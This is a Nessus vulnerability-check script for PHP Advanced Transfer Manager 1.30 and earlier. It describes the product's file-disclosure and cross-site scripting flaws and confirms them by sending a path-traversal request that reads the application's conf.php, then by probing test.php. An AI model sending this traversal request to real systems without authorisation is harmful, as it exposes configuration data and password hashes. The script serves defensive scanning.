#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(19768);
  script_version("$Revision: 1.19 $");

  script_bugtraq_id(
    14883, 
    14887, 
    15074, 
    15237
 );

  name["english"] = "PHP Advanced Transfer Manager <= 1.30 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that suffers from cross-
site scripting and information disclosure vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of PHP Advanced Transfer Manager on the remote host
suffers from multiple information disclosure and cross-site scripting
flaws.  For example, by calling a text or HTML viewer directly, an
unauthenticated attacker can view arbitrary files, provided PHP's
'register_globals' setting is enabled.  In addition, it may allow
anyone to directly retrieve users' configuration files, with encrypted
password hashes as well as the application's 'test.php' script, which
reveals information about the configuration of PHP on the remote host. 
And finally, it fails to adequately filter arbitrary HTML and script
code before using it in dynamically-generated pages." );
 # https://web.archive.org/web/20120402170033/http://retrogod.altervista.org/phpatm130.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7e209b1d");
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting, remove the 'test.php'
script, and prevent direct access to the 'users' directory." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/21");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:bugada_andrea:php_advanced_transfer_manager");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in PHP Advanced Transfer Manager <= 1.30";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0, php: 1);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpatm", "/phpATM", "/downloads", "/upload", "/files", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it's phpATM.
  if (
    '<a href="http://phpatm.free.fr"' >< res && 
    "Powered by PHP Advanced Transfer Manager v" >< res
  ) {
    # Try to exploit a disclosure flaw in one of the viewers..
    r = http_send_recv3(method:"GET",
      item:string(
        dir, "/viewers/txt.php?",
        "current_dir=../include&",
        "filename=conf.php"
      ),
      exit_on_fail: 1, 
      port:port
    );
    res = r[2];

    # There's a problem if it looks like the config file.
    if (egrep(string:res, pattern:'^<br>.*\\$(admin_email|homeurl|smtp_host) *= *".+" *;')) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }

    if (thorough_tests) {
      # Try to exploit the disclosure flaw in test.php.
      r = http_send_recv3(method:"GET",item:string(dir, "/test.php"), port:port, exit_on_fail: 1);
      res = r[2];

      # There's a problem if it looks like the output of test.php.
      if ("<BR>Open basedir:" >< res) {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
  }
}
